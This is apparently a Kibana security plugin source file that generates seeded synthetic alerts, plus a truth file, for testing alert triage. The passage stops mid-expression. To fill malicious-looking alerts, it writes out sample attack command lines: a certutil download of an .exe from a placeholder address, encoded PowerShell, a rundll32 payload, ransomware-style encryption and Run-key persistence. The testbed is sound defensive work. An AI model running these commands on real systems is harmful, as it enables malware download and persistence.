/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

/**
 * Generates one day of synthetic security alerts that follow the phoenix profile (`build_profile.ts`),
 * with a truth file. Everything is synthetic: no real hostname, user, path or hash appears.
 *
 * Output folder:
 * - `alerts.ndjson`: one `{ _id, _source }` line per alert, in the shape of the dump
 * - `truth.ndjson`: `{ id, verdict, variant, keyId, ruleUuid, kind }` per alert. Keep it out of the alert index
 * - `rules.json`: the rules the alerts refer to
 * - `meta.json`: seed, parameters and counts
 *
 * The same seed gives the same files. Nothing reads the clock.
 *
 * Usage:
 *   node x-pack/solutions/security/plugins/alertzero/scripts/triage_testbed/generate_alerts_cli.js \
 *     --profile <profile_phoenix.json> --out <folder> [--seed 1] [--params '{"default":{"sameWindow":0.5}}']
 */

import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { mulberry32 } from './seeded_random';

export type Severity = 'low' | 'medium' | 'high' | 'critical';
export type Verdict = 'true_positive' | 'false_positive';
type VariantName =
  | 'encoded_command_line'
  | 'untrusted_signer'
  | 'new_hash'
  | 'different_script_same_shape';
type FieldValue = string | number | boolean | string[];

/** One row of the status mix of the profile (query 1). */
export interface ProfileMixRow {
  alerts: number;
  buildingBlock: boolean;
  severity: Severity;
  status: string;
}

/** One aggregation rule of the profile (query 5). */
export interface ProfileUnkeyedRule {
  rule: string;
  severity: Severity;
  alerts: number;
}

/** The part of the profile (`profile_phoenix.json`) that the generator reads. */
export interface Profile {
  totals: { statusSeverityMix: ProfileMixRow[] };
  unkeyedRules: ProfileUnkeyedRule[];
}

interface Timing {
  sameWindow: number;
  sameHour: number;
  keySizeSigma?: number;
}

interface EntraParams extends Timing {
  keys: number;
  keySizeSigma: number;
  alerts: number;
}

export interface GeneratorParams {
  meanKeySize: number;
  keySizeSigma: number;
  falsePositiveKeyShare: number;
  unkeyedFalsePositiveShare: number;
  badVariantRate: number;
  hashUpdate: { keyShare: number; laterAlertShare: number; minKeySize: number };
  default: Timing;
  entra: EntraParams;
  bursts: { count: number; size: number };
  buildingBlock: Timing;
  kindWeights: Record<string, number>;
  rulesPerSeverity: Record<Severity, number>;
  buildingBlockRules: number;
}

export type DeepPartial<T> = { [K in keyof T]?: T[K] extends object ? DeepPartial<T[K]> : T[K] };

/** An alert document: the fields that the generator reads have their own type. */
export interface AlertDoc {
  '@timestamp': string;
  'kibana.alert.uuid': string;
  'kibana.alert.rule.uuid': string;
  'kibana.alert.rule.name': string;
  'kibana.alert.severity': Severity;
  'kibana.alert.workflow_status'?: string;
  [field: string]: FieldValue | undefined;
}

export interface TruthLine {
  id: string;
  verdict: Verdict;
  variant: string | null;
  benign: string | null;
  keyId: string;
  ruleUuid: string;
  kind: string;
}

export interface GeneratedRule {
  uuid: string;
  name: string;
  severity: Severity;
  kind: string;
  buildingBlock: boolean;
  revision: number;
  keys: number;
}

export interface GeneratedAlert {
  _id: string;
  _source: AlertDoc;
}

export interface GeneratedDay {
  rules: GeneratedRule[];
  alerts: GeneratedAlert[];
  truth: TruthLine[];
  meta: {
    seed: number;
    params: GeneratorParams;
    alerts: number;
    keyedKeys: number;
  };
}

interface Rng {
  next: () => number;
  int: (n: number) => number;
  pick: <T>(list: readonly T[]) => T;
  hex: (length: number) => string;
  normal: () => number;
  shuffle: <T>(list: T[]) => T[];
  uuid: () => string;
}

interface KeyContent {
  commandLine?: string;
  sourceIpExternal?: boolean;
  reasonText?: string;
  [field: string]: FieldValue | undefined;
}

interface Pools {
  users: string[];
  hosts: string[];
}

interface HashUpdate {
  field: string;
  window: number;
  hash: string;
}

interface BuiltAlert {
  doc: AlertDoc;
  truth: TruthLine;
}

interface CommandLineArgs {
  profile: string;
  out: string;
  seed: number;
  params: DeepPartial<GeneratorParams>;
}

const DAY_END = Date.parse('2026-11-16T00:00:00.000Z');
const WINDOW_MS = 5 * 60 * 1000;
const WINDOWS_PER_DAY = 288;
const WINDOWS_PER_HOUR = 12;

/** Tunable by calibration. `sameWindow` and `sameHour` are the chances that the next alert of a key joins the previous one. */
export const DEFAULT_PARAMS: GeneratorParams = {
  meanKeySize: 15,
  keySizeSigma: 3.2,
  // Share of alerts in false-positive keys (from the dump: 10,770 false against 4,440 true positive verdicts).
  falsePositiveKeyShare: 0.71,
  unkeyedFalsePositiveShare: 0.6,
  badVariantRate: 0.005,
  // Harmless new hashes: software updates. A share of the signed process and library keys that are false
  // positives get a new hash at a random time of the day. Alerts after that time carry it with the chance
  // `laterAlertShare` (some hosts have not updated yet). The hash is outside the key, so the key does not change.
  // 10% of keys a day is an assumption (signed software updates weekly to monthly, so 3% to 14% a day), not a
  // phoenix measurement. A key needs `minKeySize` alerts to show an update at all; a variant needs 10 (a cached verdict).
  hashUpdate: { keyShare: 0.1, laterAlertShare: 0.8, minKeySize: 4 },
  default: { sameWindow: 0.64, sameHour: 0.14 },
  // 44 keys is the phoenix value. A flatter size spread keeps the 5-minute units stable across seeds.
  entra: { sameWindow: 0.9, sameHour: 0.05, keys: 44, keySizeSigma: 0.8, alerts: 26200 },
  // The Slack thread reports executions that emit up to 1,000 alerts. Each burst puts that many alerts of one key into one window.
  bursts: { count: 3, size: 1000 },
  buildingBlock: { sameWindow: 0.64, sameHour: 0.14 },
  kindWeights: { process: 0.45, cloud: 0.25, file: 0.12, registry: 0.12, library: 0.06 },
  rulesPerSeverity: { low: 25, medium: 15, high: 8, critical: 2 },
  buildingBlockRules: 8,
};

const ENTRA_RULE = 'Entra ID Application Self-Assigned to Privileged Role';

const parseArgs = (argv: readonly string[]): CommandLineArgs => {
  let profile: string | undefined;
  let out: string | undefined;
  let seed = 1;
  let params: DeepPartial<GeneratorParams> = {};
  for (let i = 2; i < argv.length; i++) {
    if (argv[i] === '--profile') profile = argv[++i];
    else if (argv[i] === '--out') out = argv[++i];
    else if (argv[i] === '--seed') seed = Number(argv[++i]);
    else if (argv[i] === '--params') params = JSON.parse(argv[++i]) as DeepPartial<GeneratorParams>;
  }
  if (!profile || !out) throw new Error('--profile <file> and --out <folder> are required');
  return { profile, out, seed, params };
};

interface ParamTree {
  [key: string]: number | string[] | ParamTree | undefined;
}

const merge = <T extends object>(base: T, extra: DeepPartial<T> | undefined): T =>
  Object.fromEntries(
    Object.entries(base as ParamTree).map(([k, v]) => {
      const override = (extra as ParamTree | undefined)?.[k];
      return [
        k,
        v && typeof v === 'object' && !Array.isArray(v)
          ? merge(v, (override ?? {}) as DeepPartial<ParamTree>)
          : override ?? v,
      ];
    })
  ) as T;

// ---------------------------------------------------------------------------------------------
// Seeded random numbers
// ---------------------------------------------------------------------------------------------

const makeRng = (seed: number): Rng => {
  const next = mulberry32(seed);
  const int = (n: number): number => Math.floor(next() * n);
  const pick = <T>(list: readonly T[]): T => list[int(list.length)];
  const hex = (length: number): string =>
    Array.from({ length }, () => int(16).toString(16)).join('');
  const normal = () => Math.sqrt(-2 * Math.log(1 - next())) * Math.cos(2 * Math.PI * next());
  const shuffle = <T>(list: T[]): T[] => {
    for (let i = list.length - 1; i > 0; i--) {
      const j = int(i + 1);
      [list[i], list[j]] = [list[j], list[i]];
    }
    return list;
  };
  const uuid = () => `${hex(8)}-${hex(4)}-4${hex(3)}-${'89ab'[int(4)]}${hex(3)}-${hex(12)}`;
  return { next, int, pick, hex, normal, shuffle, uuid };
};

/** Splits `total` into `parts` positive integers with weights `weights` (largest remainder). */
const splitByWeight = (total: number, weights: number[]): number[] => {
  const sum = weights.reduce((a, b) => a + b, 0);
  const exact = weights.map((w) => (w / sum) * (total - weights.length));
  const sizes = exact.map((x) => 1 + Math.floor(x));
  let left = total - sizes.reduce((a, b) => a + b, 0);
  const order = exact.map((x, i) => [x - Math.floor(x), i]).sort((a, b) => b[0] - a[0]);
  for (let i = 0; left > 0; i = (i + 1) % order.length, left--) sizes[order[i][1]]++;
  return sizes;
};

// ---------------------------------------------------------------------------------------------
// Synthetic content. A false-positive key reads as benign, a true-positive key reads as malicious.
// ---------------------------------------------------------------------------------------------

const VENDORS = ['Acme Soft', 'Nordwind', 'Bluepeak', 'Kestrel Labs', 'Orbitron', 'Fjord Systems'];
const APPS = [
  'syncagent',
  'updater',
  'indexer',
  'telemetryd',
  'backupsvc',
  'printhelper',
  'vpnclient',
];
const BENIGN_PARENTS = ['C:\\Windows\\System32\\services.exe', 'C:\\Windows\\explorer.exe'];
const SUSPICIOUS_PARENTS = [
  'C:\\Program Files\\Office\\winword.exe',
  'C:\\Windows\\System32\\wscript.exe',
];
/**
 * A value from a list that depends only on a text, not on the random stream of the run. The context fields below are
 * added to existing alerts, and a draw from the stream would move every later draw and change keys, rules and ids.
 */
const hashInt = (text: string, modulo: number): number =>
  crypto.createHash('sha256').update(text).digest().readUInt32BE(0) % modulo;
const pickByHash = <T>(list: readonly T[], text: string): T => list[hashInt(text, list.length)];

/**
 * The families of the aggregation rules (the unkeyed rules of query 5), by words of the rule name. A real model compares the alert with what
 * the rule claims to detect: in round 3 it dismissed an "AWS S3 ... API Calls" rule because the alert was a generic network connection
 * ("no AWS S3 API calls identified"), but accepted the same connection under the GKE, GitHub and Okta rules. So the actions are those of
 * the rule, the SAME for both verdicts of a rule, and the truth sits in who acted and from where, as an analyst reads it.
 * `provider` is set only where `cloud.provider` has a value (AWS, GCP); the dataset says which audit log the alert comes from.
 */
interface AggregateFamily {
  match: RegExp;
  dataset: string;
  provider?: string;
  usualRegions?: string[];
  unusualRegions?: string[];
  actions: string[];
  badPrincipal: string;
  goodPrincipal: string;
}

const AGGREGATE_FAMILIES: AggregateFamily[] = [
  {
    match: /S3/i,
    dataset: 'aws.cloudtrail',
    provider: 'aws',
    actions: [
      'GetBucketAcl',
      'GetBucketPolicy',
      'GetBucketPublicAccessBlock',
      'GetBucketEncryption',
    ],
    badPrincipal: 'root',
    goodPrincipal: 'config-scanner',
  },
  {
    match: /EC2|DescribeInstances/i,
    dataset: 'aws.cloudtrail',
    provider: 'aws',
    actions: ['DescribeInstances', 'DescribeSecurityGroups', 'DescribeVolumes'],
    badPrincipal: 'root',
    goodPrincipal: 'inventory-sync',
  },
  {
    match: /AWS/i,
    dataset: 'aws.cloudtrail',
    provider: 'aws',
    actions: ['ListAccessKeys', 'GetAccessKeyLastUsed', 'ListUsers'],
    badPrincipal: 'root',
    goodPrincipal: 'iam-auditor',
  },
  {
    match: /GKE|Kubernetes/i,
    dataset: 'gcp.audit',
    provider: 'gcp',
    // GCP names its regions differently from AWS; a model notices an AWS region name on a GKE alert.
    usualRegions: ['us-east1', 'europe-west1', 'europe-west4'],
    unusualRegions: ['africa-south1', 'me-central2', 'asia-southeast2'],
    actions: [
      'io.k8s.core.v1.pods.list',
      'io.k8s.rbac.v1.clusterroles.list',
      'io.k8s.core.v1.secrets.list',
    ],
    badPrincipal: 'system:anonymous',
    goodPrincipal: 'monitoring-agent',
  },
  {
    match: /Okta/i,
    dataset: 'okta.system',
    actions: ['user.session.start', 'user.authentication.sso'],
    badPrincipal: 'admin-impersonation',
    goodPrincipal: 'svc-directory-sync',
  },
  {
    match: /GitHub/i,
    dataset: 'github.audit',
    actions: ['git.clone', 'repo.download_zip'],
    badPrincipal: 'unmanaged-device-bot',
    goodPrincipal: 'ci-bot',
  },
];
const DEFAULT_AGGREGATE_FAMILY = AGGREGATE_FAMILIES[2];

/**
 * Context of an aggregation alert, by verdict and rule family. A true positive is a successful action of an unusual principal (root,
 * anonymous, an impersonation) from an unusual region and an external address, with a critical host and a high user risk; a false
 * positive is the same action of a service principal from a usual region and an internal address. An aggregation alert has no user
 * name and no account, so none of these fields can give it a strict key (an action alone does not).
 */
const aggregateContext = (
  bad: boolean,
  text: string,
  hasSourceIp: boolean,
  ruleName: string
): KeyContent => {
  const family =
    AGGREGATE_FAMILIES.find((candidate) => candidate.match.test(ruleName)) ??
    DEFAULT_AGGREGATE_FAMILY;
  return {
    'event.dataset': family.dataset,
    ...(family.provider
      ? {
          'cloud.provider': family.provider,
          'cloud.region': pickByHash(
            (bad ? family.unusualRegions : family.usualRegions) ??
              (bad ? UNUSUAL_REGIONS : USUAL_REGIONS),
            `region|${text}`
          ),
        }
      : {}),
    'event.action': pickByHash(family.actions, text),
    'event.outcome': 'success',
    'event.type': ['access'],
    'user.id': bad ? family.badPrincipal : family.goodPrincipal,
    'user.asset.criticality': bad ? 'extreme_impact' : 'low_impact',
    'user.risk.calculated_level': bad ? 'High' : 'Low',
    'host.risk.calculated_level': bad ? 'Critical' : 'Low',
    ...(hasSourceIp
      ? {}
      : {
          'source.ip': bad
            ? `198.51.100.${1 + hashInt(text, 250)}`
            : `10.0.${hashInt(`net|${text}`, 4)}.${1 + hashInt(text, 250)}`,
        }),
  };
};

const CLOUD_SERVICE_ROLES = ['ci-deploy', 'backup-agent', 'monitoring', 'inventory-sync'];
const USUAL_REGIONS = ['eu-west-1', 'us-east-1', 'eu-central-1'];
const UNUSUAL_REGIONS = ['af-south-1', 'ap-southeast-3', 'me-central-1'];

const CLOUD_BENIGN_ACTIONS = [
  'DescribeInstances',
  'ListBuckets',
  'GetCallerIdentity',
  'DescribeVolumes',
];
const CLOUD_MALICIOUS_ACTIONS = [
  'CreateAccessKey',
  'AttachUserPolicy',
  'PutBucketPolicy',
  'StopLogging',
];

const makeKeyContent = (
  rng: Rng,
  kind: string,
  verdict: Verdict,
  ruleName: string,
  keyIdx: number,
  pools: Pools
): KeyContent => {
  const bad = verdict === 'true_positive';
  const vendor = rng.pick(VENDORS);
  const app = `${rng.pick(APPS)}${keyIdx}`;
  const user = rng.pick(pools.users);
  const sha = crypto
    .createHash('sha256')
    .update(`${ruleName}${keyIdx}${rng.hex(8)}`)
    .digest('hex');
  const tempExe = `C:\\Users\\${user}\\AppData\\Local\\Temp\\${rng.hex(8)}.exe`;
  const exe = bad ? tempExe : `C:\\Program Files\\${vendor}\\${app}\\${app}.exe`;
  const signer = bad ? undefined : `${vendor} Inc.`;
  const base = { 'host.os.type': 'windows' };

  if (kind === 'process') {
    return {
      ...base,
      'event.category': ['process'],
      'process.executable': exe,
      'process.name': path.win32.basename(exe),
      ...(signer ? { 'process.code_signature.subject_name': signer } : {}),
      'process.code_signature.trusted': !bad,
      'process.hash.sha256': sha,
      'process.parent.executable': bad ? rng.pick(SUSPICIOUS_PARENTS) : rng.pick(BENIGN_PARENTS),
      commandLine: bad
        ? `cmd.exe /c certutil -urlcache -split -f http://203.0.113.${rng.int(250)}/${rng.hex(
            6
          )}.bin ${rng.hex(6)}.exe`
        : `${app}.exe --service --profile=default`,
    };
  }
  if (kind === 'file') {
    return {
      ...base,
      'event.category': ['file'],
      'file.path': bad
        ? `C:\\Users\\${user}\\Documents\\report${keyIdx}.docx.locked`
        : `C:\\ProgramData\\${vendor}\\cache\\${app}.tmp`,
      'file.hash.sha256': sha,
      'process.executable': exe,
      'process.name': path.win32.basename(exe),
      'process.code_signature.trusted': !bad,
      commandLine: bad ? `${path.win32.basename(exe)} --encrypt --all` : `${app}.exe --cache`,
    };
  }
  if (kind === 'registry') {
    return {
      ...base,
      'event.category': ['registry'],
      'registry.path': bad
        ? `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\${rng.hex(6)}`
        : `HKEY_LOCAL_MACHINE\\SOFTWARE\\${vendor}\\${app}\\Settings`,
      'process.executable': exe,
      'process.name': path.win32.basename(exe),
      'process.code_signature.trusted': !bad,
      commandLine: bad ? `${path.win32.basename(exe)} /persist` : `${app}.exe --settings`,
    };
  }
  if (kind === 'library') {
    return {
      ...base,
      'event.category': ['library'],
      'dll.path': bad
        ? `C:\\Users\\${user}\\AppData\\Local\\Temp\\${rng.hex(6)}.dll`
        : `C:\\Program Files\\${vendor}\\${app}\\${app}.dll`,
      ...(signer ? { 'dll.code_signature.subject_name': signer } : {}),
      'dll.hash.sha256': sha,
      'process.executable': exe,
      'process.name': path.win32.basename(exe),
      commandLine: bad ? 'rundll32.exe payload.dll,Start' : `${app}.exe --load`,
    };
  }
  // cloud and identity: no path, only an action and a scope
  const account = `${100000000000 + rng.int(899999999999)}`;
  return {
    'event.category': ['iam'],
    'event.action': bad
      ? `${rng.pick(CLOUD_MALICIOUS_ACTIONS)}${keyIdx % 3 ? '' : 'V2'}`
      : `${rng.pick(CLOUD_BENIGN_ACTIONS)}${keyIdx % 3 ? '' : 'V2'}`,
    'cloud.account.id': account,
    // The context of a real cloud alert, in fields that the prompt of the Alert Analysis workflow shows. Without it a
    // cloud true positive is a bare API call, and a real model reads it as routine administration (14% found in the
    // first real run).
    'cloud.provider': 'aws',
    'cloud.region': pickByHash(
      bad ? UNUSUAL_REGIONS : USUAL_REGIONS,
      `region|${ruleName}|${keyIdx}`
    ),
    'event.outcome': 'success',
    'event.type': bad ? ['change'] : ['info'],
    // The principal, in mapped fields (the cloud-specific principal fields are not in the mapping of the alert index).
    'user.id': bad ? 'root' : pickByHash(CLOUD_SERVICE_ROLES, `role|${ruleName}|${keyIdx}`),
    'user.asset.criticality': bad ? 'extreme_impact' : 'low_impact',
    'user.risk.calculated_level': bad ? 'High' : 'Low',
    sourceIpExternal: bad,
  };
};

/** Fields of a planted bad variant. They differ from the key's benign content in one place. */
/**
 * The hash field that the novelty guard watches, by kind of key. It must lie OUTSIDE the key: a process key with a
 * signer and a library key with a signer do not contain their hash. A file key holds `file.hash.sha256`, so a new
 * file hash is a new key (not a guard case), and a registry key has no hash.
 */
const GUARDED_HASH: Record<string, string> = {
  process: 'process.hash.sha256',
  library: 'dll.hash.sha256',
};

const VARIANTS: Record<VariantName, (rng: Rng, kind: string) => KeyContent> = {
  encoded_command_line: (rng: Rng) => ({
    commandLine: `powershell.exe -enc ${Buffer.from(rng.hex(60), 'hex')
      .toString('base64')
      .replace(/[^A-Za-z0-9]/g, 'A')}`,
  }),
  untrusted_signer: () => ({ 'process.code_signature.trusted': false }),
  new_hash: (rng, kind) => ({ [GUARDED_HASH[kind]]: rng.hex(64) }),
  different_script_same_shape: (rng: Rng) => ({
    commandLine: `wscript.exe //B "C:\\Users\\Public\\${rng.hex(6)}.vbs"`,
  }),
};
const VARIANT_NAMES = Object.keys(VARIANTS) as VariantName[];
/** A key kind without a guarded hash cannot carry a new-hash variant. */
const variantNamesFor = (kind: string): VariantName[] =>
  GUARDED_HASH[kind] ? VARIANT_NAMES : VARIANT_NAMES.filter((name) => name !== 'new_hash');

// ---------------------------------------------------------------------------------------------
// Time model. An alert joins the previous alert of its key, or lands in a random window.
// ---------------------------------------------------------------------------------------------

const makeWindows = (rng: Rng, count: number, { sameWindow, sameHour }: Timing): number[] => {
  const windows = [rng.int(WINDOWS_PER_DAY)];
  for (let i = 1; i < count; i++) {
    const previous = windows[i - 1];
    const roll = rng.next();
    if (roll < sameWindow) windows.push(previous);
    else if (roll < sameWindow + sameHour) {
      windows.push(previous - (previous % WINDOWS_PER_HOUR) + rng.int(WINDOWS_PER_HOUR));
    } else windows.push(rng.int(WINDOWS_PER_DAY));
  }
  return windows;
};

const timestampOf = (rng: Rng, window: number): string =>
  new Date(DAY_END - 24 * 3600 * 1000 + window * WINDOW_MS + rng.int(WINDOW_MS)).toISOString();

// ---------------------------------------------------------------------------------------------
// Build the day
// ---------------------------------------------------------------------------------------------

const RULE_TITLES: Record<string, string> = {
  process: 'Endpoint Process Execution Anomaly',
  file: 'Endpoint File Modification Anomaly',
  registry: 'Endpoint Registry Modification Anomaly',
  library: 'Endpoint Library Load Anomaly',
  cloud: 'Cloud API Activity Anomaly',
};

/** The arguments of `addRule` without the building-block flag: a name that says what the rule watches, severity and kind. */
const ruleNameAndKind = (
  rng: Rng,
  weights: Record<string, number>,
  number: number,
  severity: Severity,
  prefix = ''
): [string, Severity, string] => {
  const kind = weightedKind(rng, weights);
  return [`${prefix}${RULE_TITLES[kind]} ${number}`, severity, kind];
};

const baseName = (value: FieldValue | undefined): string =>
  value ? path.win32.basename(String(value)) : 'unknown';

const reasonOf = (rule: GeneratedRule, doc: AlertDoc): string => {
  const host = doc['host.name'];
  const signer = doc['process.code_signature.subject_name'];
  const actor = `${baseName(doc['process.executable'])} (${
    signer ? `signed by ${signer}` : 'unsigned'
  })`;
  if (doc['dll.path']) {
    const dllSigner = doc['dll.code_signature.subject_name'];
    return `Library ${baseName(doc['dll.path'])} (${
      dllSigner ? `signed by ${dllSigner}` : 'unsigned'
    }) loaded by ${baseName(doc['process.executable'])} on ${host}. Rule: ${rule.name}.`;
  }
  if (doc['registry.path'])
    return `Registry value ${doc['registry.path']} set by ${actor} on ${host}. Rule: ${rule.name}.`;
  if (doc['file.path'])
    return `File ${doc['file.path']} written by ${actor} on ${host}. Rule: ${rule.name}.`;
  if (doc['process.executable']) {
    return `Process ${actor} started by ${baseName(
      doc['process.parent.executable']
    )} on ${host}. Rule: ${rule.name}.`;
  }
  return `API call ${doc['event.action']} in account ${doc['cloud.account.id']} from ${doc['source.ip']}. Rule: ${rule.name}.`;
};

const weightedKind = (rng: Rng, weights: Record<string, number>): string => {
  const roll = rng.next() * Object.values(weights).reduce((a, b) => a + b, 0);
  let sum = 0;
  const found = Object.entries(weights).find(([, w]) => (sum += w) > roll);
  if (!found)
    throw new Error(
      `no kind of alert has a weight: ${JSON.stringify(
        weights
      )} (building-block rules never get the cloud kind)`
    );
  return found[0];
};

const buildDay = (
  profile: Profile,
  seed: number,
  params: GeneratorParams
): { rules: GeneratedRule[]; alerts: BuiltAlert[]; keyCount: number } => {
  // Each section has its own random stream, so a change in one section does not shift the others.
  let rng = makeRng(seed);
  const streamFor = (name: string): Rng =>
    makeRng(crypto.createHash('sha256').update(`${seed}|${name}`).digest().readUInt32BE(0));
  const section = (name: string): void => {
    rng = streamFor(name);
  };
  const pools: Pools = {
    users: Array.from({ length: 60 }, (_, i) => `user${String(i).padStart(3, '0')}`),
    hosts: Array.from({ length: 400 }, (_, i) => `host-${String(i).padStart(4, '0')}`),
  };
  const rules: GeneratedRule[] = [];
  const alerts: BuiltAlert[] = [];
  const keyCount = { keyed: 0 };

  const addRule = (
    name: string,
    severity: Severity,
    kind: string,
    buildingBlock = false
  ): GeneratedRule => {
    const rule: GeneratedRule = {
      uuid: rng.uuid(),
      name,
      severity,
      kind,
      buildingBlock,
      revision: 1,
      keys: 0,
    };
    rules.push(rule);
    return rule;
  };

  const emit = ({
    rule,
    keyId,
    content,
    verdict,
    variant,
    window,
    unkeyed,
    hashUpdate,
  }: {
    rule: GeneratedRule;
    keyId: string;
    content: KeyContent;
    verdict: Verdict;
    variant?: VariantName;
    window: number;
    unkeyed?: boolean;
    hashUpdate?: HashUpdate;
  }): void => {
    const { commandLine, sourceIpExternal, reasonText, ...fields } = content;
    const id = crypto
      .createHash('sha256')
      .update(`${seed}|${alerts.length}|${keyId}`)
      .digest('hex');
    const host = rng.pick(pools.hosts);
    const user = rng.pick(pools.users);
    const doc: AlertDoc = {
      '@timestamp': timestampOf(rng, window),
      'kibana.alert.uuid': id,
      'kibana.alert.rule.uuid': rule.uuid,
      'kibana.alert.rule.name': rule.name,
      'kibana.alert.rule.revision': rule.revision,
      'kibana.alert.severity': rule.severity,
      'kibana.alert.risk_score': { low: 21, medium: 47, high: 73, critical: 99 }[rule.severity],
      'kibana.alert.status': 'active',
      'kibana.alert.workflow_tags': [],
      'event.kind': 'signal',
      'host.name': host,
      ...fields,
      ...(hashUpdate ? { [hashUpdate.field]: hashUpdate.hash } : {}),
      ...(variant ? VARIANTS[variant](rng, rule.kind) : {}),
    };
    if (rule.buildingBlock) doc['kibana.alert.building_block_type'] = 'default';
    const cmd = variant ? doc.commandLine ?? commandLine : commandLine;
    delete doc.commandLine;
    if (cmd) doc['process.command_line'] = cmd;
    // An unkeyed alert carries only aggregation output: no user, action or account.
    if (!unkeyed) doc['user.name'] = user;
    if (rule.kind === 'cloud' && !unkeyed) {
      doc['source.ip'] = sourceIpExternal
        ? `198.51.100.${rng.int(250)}`
        : `10.0.${rng.int(4)}.${rng.int(250)}`;
    }
    // The reason states facts that an analyst can read, and never the verdict.
    doc['kibana.alert.reason'] = reasonText ?? reasonOf(rule, doc);
    alerts.push({
      doc,
      truth: {
        id,
        verdict,
        variant: variant ?? null,
        // A harmless change that a guard should not flag, so that the false alarms of a guard can be counted.
        benign: hashUpdate && !variant ? 'hash_update' : null,
        keyId,
        ruleUuid: rule.uuid,
        kind: rule.kind,
      },
    });
  };

  /** Creates the keys of a group of rules and emits their alerts. */
  const burst = { left: params.bursts.count };
  const buildKeyedGroup = ({
    rulesOfGroup,
    total,
    keys,
    timing,
    buildingBlock,
    allowBursts,
  }: {
    rulesOfGroup: GeneratedRule[];
    total: number;
    keys: number;
    timing: Timing;
    buildingBlock?: boolean;
    allowBursts?: boolean;
  }): void => {
    if (total === 0) return;
    const keyCountForGroup = Math.max(1, Math.min(total, keys));
    const weights = Array.from({ length: keyCountForGroup }, () =>
      Math.exp((timing.keySizeSigma ?? params.keySizeSigma) * rng.normal())
    );
    const sizes = splitByWeight(total, weights).sort((a, b) => b - a);
    const ruleWeights = rulesOfGroup.map((_, i) => 1 / (i + 1));
    const ruleWeightSum = ruleWeights.reduce((a, b) => a + b, 0);
    sizes.forEach((size) => {
      let roll = rng.next() * ruleWeightSum;
      const rule = rulesOfGroup.find((_, i) => (roll -= ruleWeights[i]) < 0) ?? rulesOfGroup[0];
      const keyId = `${rule.uuid.slice(0, 8)}-${rule.keys++}`;
      const verdict =
        rng.next() < params.falsePositiveKeyShare || buildingBlock
          ? 'false_positive'
          : 'true_positive';
      const content = makeKeyContent(rng, rule.kind, verdict, rule.name, rule.keys, pools);
      const windows = makeWindows(rng, size, timing);
      if (allowBursts && burst.left > 0 && size >= params.bursts.size) {
        windows.fill(windows[0], 0, params.bursts.size);
        burst.left--;
      }
      // A bad variant needs a key that is old enough to have a cached verdict. It changes process fields only, so a cloud key has none.
      // Process fields are outside the key of a file, registry or library alert, so the key does not change.
      const canPlant =
        verdict === 'false_positive' &&
        !buildingBlock &&
        size >= 10 &&
        ['process', 'file', 'registry', 'library'].includes(rule.kind);
      // A software update: its own random stream, so that the other draws of the run do not move.
      const guardedHash = GUARDED_HASH[rule.kind];
      const canUpdate =
        verdict === 'false_positive' &&
        !buildingBlock &&
        size >= params.hashUpdate.minKeySize &&
        Boolean(guardedHash);
      const updateStream = canUpdate ? streamFor(`hash-update|${keyId}`) : undefined;
      const update: HashUpdate | undefined =
        updateStream && updateStream.next() < params.hashUpdate.keyShare
          ? {
              field: guardedHash,
              window: updateStream.int(WINDOWS_PER_DAY),
              hash: updateStream.hex(64),
            }
          : undefined;
      windows
        .map((window, i) => ({ window, i }))
        .sort((a, b) => a.window - b.window)
        .forEach(({ window }, rank) => {
          const planted = canPlant && rank >= 3 && rng.next() < params.badVariantRate;
          const variant = planted ? rng.pick(variantNamesFor(rule.kind)) : undefined;
          const updated =
            updateStream &&
            update &&
            window >= update.window &&
            updateStream.next() < params.hashUpdate.laterAlertShare;
          emit({
            rule,
            keyId,
            content,
            verdict: variant ? 'true_positive' : verdict,
            variant,
            window,
            hashUpdate: updated ? update : undefined,
          });
        });
    });
    keyCount.keyed += sizes.length;
  };

  const cell = (buildingBlock: boolean, severity: Severity): number =>
    profile.totals.statusSeverityMix
      .filter((r) => r.buildingBlock === buildingBlock && r.severity === severity)
      .reduce((sum, r) => sum + r.alerts, 0);

  const severities: Severity[] = ['low', 'medium', 'high', 'critical'];

  // Unkeyed rules, sized and named as in query 5.
  section('unkeyed');
  const unkeyedBySeverity: Partial<Record<Severity, number>> = {};
  profile.unkeyedRules.forEach((unkeyed, ruleIdx) => {
    const rule = addRule(unkeyed.rule, unkeyed.severity, 'aggregate');
    unkeyedBySeverity[unkeyed.severity] =
      (unkeyedBySeverity[unkeyed.severity] ?? 0) + unkeyed.alerts;
    // A few of the rules carry a source address. Their counts of distinct addresses come from the plan.
    const distinctByRule: Record<string, number | undefined> = {
      'GKE Anonymous Endpoint Permission Enumeration': 15,
      'GKE Endpoint Permission Enumeration': 19,
      'AWS S3 Rapid Bucket Posture API Calls from a Single Principal': 155,
      'GitHub Bot Account Activity from Unmanaged IP Address': unkeyed.alerts,
      'AWS EC2 Multi-Region DescribeInstances API Calls from an unmanaged IP [Elastic Cloud]': 9,
    };
    const distinct = distinctByRule[unkeyed.rule];
    const ruleVerdictBias = rng.next();
    const windows = makeWindows(rng, unkeyed.alerts, params.default);
    windows.forEach((window, i) => {
      const verdict =
        rng.next() < (ruleVerdictBias < 0.5 ? params.unkeyedFalsePositiveShare : 0.4)
          ? 'false_positive'
          : 'true_positive';
      const baseline = 5 + rng.int(20);
      const observed =
        verdict === 'true_positive' ? baseline * (15 + rng.int(45)) : baseline + rng.int(baseline);
      const content = {
        reasonText: `${rule.name}: ${observed} events in 5 minutes against a usual ${baseline} for this principal.`,
        'event.category': ['network'],
        ...(distinct ? { 'source.ip': `192.0.2.${(i % distinct) % 250}` } : {}),
        // Context fields that the prompt shows (the count in the reason text is not in it), by rule family. An aggregation alert has no
        // user name and no account, so no field here can turn it into a keyed alert.
        ...aggregateContext(
          verdict === 'true_positive',
          `${unkeyed.rule}|${i}`,
          Boolean(distinct),
          unkeyed.rule
        ),
      };
      emit({ rule, keyId: `unkeyed-${ruleIdx}-${i}`, content, verdict, window, unkeyed: true });
    });
  });

  // Entra ID rule: one high severity identity rule with very large keys.
  section('entra');
  const entra = addRule(ENTRA_RULE, 'high', 'cloud');
  buildKeyedGroup({
    rulesOfGroup: [entra],
    total: params.entra.alerts,
    keys: params.entra.keys,
    timing: params.entra,
  });

  // Other keyed rules per severity.
  severities.forEach((severity) => {
    section(`keyed-${severity}`);
    const total =
      cell(false, severity) -
